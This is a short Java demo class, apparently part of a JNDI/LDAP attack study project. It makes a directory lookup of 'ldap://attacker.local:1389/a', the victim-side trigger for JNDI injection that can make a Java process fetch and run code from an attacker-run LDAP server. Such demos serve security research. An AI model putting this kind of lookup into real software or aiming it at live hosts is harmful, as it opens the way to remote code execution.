package org.neuronaddict.ldapserver;

import javax.naming.NamingException;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;

public class LookupDemo {

    public static void main(String[] args) throws Exception {
        simpleLookup();
    }

    private static void simpleLookup() throws NamingException {
        DirContext context = new InitialDirContext();

        System.out.println(context.lookup("ldap://attacker.local:1389/a"));
    }
}
